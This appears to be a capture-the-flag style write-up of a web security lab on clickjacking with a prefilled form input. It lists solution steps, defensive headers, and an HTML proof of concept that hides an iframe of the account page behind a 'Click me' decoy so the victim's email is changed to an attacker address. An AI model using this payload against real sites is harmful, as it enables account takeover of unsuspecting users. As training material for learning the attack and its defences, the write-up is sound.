# **Clickjacking - Prefilled Form Input**

## **Lab Completion**
Lab Completed: Clickjacking - Prefilled Form Input

---

## **Challenge**
Exploit a clickjacking vulnerability to prefill a form input and perform an unintended action on behalf of the victim.

---

## **Solution**

1. **Analyzed the Target:**
   - Discovered a user account page containing an "Update email" form.

2. **Crafted the Exploit:**
   - Created an HTML page with an iframe pointing to the target form.

3. **Aligned the Elements:**
   - Adjusted the iframe and overlay positioning to ensure the "Click me" action aligned with the "Update email" button.

4. **Tested and Optimized:**
   - Used `opacity: 0.1` for alignment testing and changed it to `opacity: 0.0001` for the final attack.

5. **Delivered the Exploit:**
   - Shared the crafted exploit page with the victim to trigger the vulnerability.

---

## **Key Takeaways**

- **Avoid Embedding Forms in iFrames:**
  - Disable iframe embedding using the `X-Frame-Options` header.

- **Implement Clickjacking Protections:**
  - Use `Content-Security-Policy: frame-ancestors 'none'` or allow specific trusted domains.

- **Verify User Intent:**
  - Require re-authentication or user interaction for sensitive actions.

---

## **Proof of Concept (PoC)**
Here’s the crafted HTML code used in the exploit:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 500px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a04003704aff4ee81600c3d00140064.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

---

## **Write-Up**
For a detailed explanation of this lab, visit the full write-up:
[Clickjacking - Prefilled Form Input](https://lnkd.in/equJv7iW)
